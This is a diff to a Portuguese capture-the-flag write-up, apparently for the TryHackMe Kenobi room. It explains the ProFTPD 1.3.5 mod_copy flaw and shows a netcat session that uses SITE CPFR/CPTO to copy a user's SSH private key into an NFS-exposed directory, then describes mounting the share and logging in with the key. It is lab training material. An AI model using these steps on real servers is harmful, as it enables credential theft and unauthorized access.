@@ -284,9 +284,44 @@ ProFTPd 1.3.5 - File Copy                      | linux/remote/36742.txt
 Shellcodes: No Results
 ```
 
-Foram listados 4. Essa é a resposta da questão 
+Foram listados 4. Essa é a resposta da questão ***b***. 
+
+Mais indormações sobre o mod_copy [aqui](http://www.proftpd.org/docs/contrib/mod_copy.html).
+
+O módulo mod_copy implementa os comandos SITE CPFR e SITE CPTO, que podem ser usados para copiar arquivos/diretórios de um lugar para outro no servidor. Qualquer cliente não autenticado pode aproveitar esses comandos para copiar arquivos de qualquer parte do sistema de arquivos para um destino escolhido.
+
+Sabe-se que o serviço FTP está sendo executado como o usuário Kenobi (do arquivo log.txt baixado do compartilhamento smb) e uma chave ssh é gerada para esse usuário.
+
+Agora, copia-se a chave privada do Kenobi usando os comandos SITE CPFR e SITE CPTO.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ nc 10.10.87.116 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.87.116]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+```
+Para conexão foi usado o netcat (nc).
+
+Como já se sabe, o ***/var*** é um ponto de montagem smb (task 2), ficou fácil obter a chave privada do usuário que movemos para ***/var/tmp***.
+
+Agora, basta montar:
+![Mount NFS](images/mount_nfs.png)
+
+Depois disto, pode-se simplesmente acessar o diretório /mnt/kenobiNFS/tmp, copiar e ajustar permissões na chave privada do usuário kenobi. Por fim, usar esta chave para acesso ssh ao host alvo.
+
+Execução:
+
+![Acesso SSH](images/ssh_with_key.png)
+
+Agora, basta ler o arquivo user.txt que está no home do usuário para responder a questão ***c***.
+
 ### Questões
 
 - a. ***What is the version?*** *1.3.5*
 
 - b. ***How many exploits are there for the ProFTPd running?*** *4*
+
+- c. ***What is Kenobi's user flag (/home/kenobi/user.txt)?*** 
